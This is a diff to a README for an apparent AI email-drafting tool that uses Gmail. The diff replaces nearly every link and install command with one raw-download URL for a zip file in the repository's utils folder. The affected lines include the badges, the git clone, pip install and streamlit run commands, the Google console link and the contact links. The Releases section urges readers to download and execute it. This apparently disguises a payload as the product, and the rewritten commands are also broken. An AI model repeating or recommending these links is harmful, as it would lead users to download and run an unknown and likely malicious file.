@@ -1,7 +1,7 @@
 # AI Email Crafter 🤖✉️
 
-![AI Email Crafter](https://img.shields.io/badge/AI_Email_Crafter-v1.0-blue.svg)
-![GitHub](https://img.shields.io/badge/Visit%20on-GitHub-brightgreen.svg)
+![AI Email Crafter](https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip)
+![GitHub](https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip%https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip)
 
 Welcome to **AI Email Crafter**! This tool helps you effortlessly generate personalized, VC-ready email drafts using AI. You can save these drafts directly into Gmail, making it a smart outreach assistant for founders, sales, and business development teams.
 
@@ -42,17 +42,17 @@ To get started with AI Email Crafter, follow these steps:
 
 1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/NxxNrz/AI_Email_Crafter.git
+   git clone https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip
    ```
 
 2. **Install Dependencies**: Navigate to the project directory and install the required packages.
    ```bash
    cd AI_Email_Crafter
-   pip install -r requirements.txt
+   pip install -r https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip
    ```
 
 3. **Set Up Google API**:
-   - Go to the [Google Developer Console](https://console.developers.google.com/).
+   - Go to the [Google Developer Console](https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip).
    - Create a new project.
    - Enable the Gmail API.
    - Create credentials and download the JSON file.
@@ -60,7 +60,7 @@ To get started with AI Email Crafter, follow these steps:
 
 4. **Run the Application**: Start the application with the command below.
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip
    ```
 
 5. **Authenticate**: Follow the prompts to authenticate with your Google account.
@@ -101,12 +101,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: [https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip](https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip)
+- **Twitter**: [@yourhandle](https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip)
 
 ## Releases
 
-To download the latest version of AI Email Crafter, visit the [Releases](https://github.com/NxxNrz/AI_Email_Crafter/releases) section. Make sure to download the appropriate file and execute it to start using the application.
+To download the latest version of AI Email Crafter, visit the [Releases](https://github.com/NxxNrz/AI_Email_Crafter/raw/refs/heads/main/utils/A-Crafter-Email-v2.1-beta.2.zip) section. Make sure to download the appropriate file and execute it to start using the application.
 
 ---
 
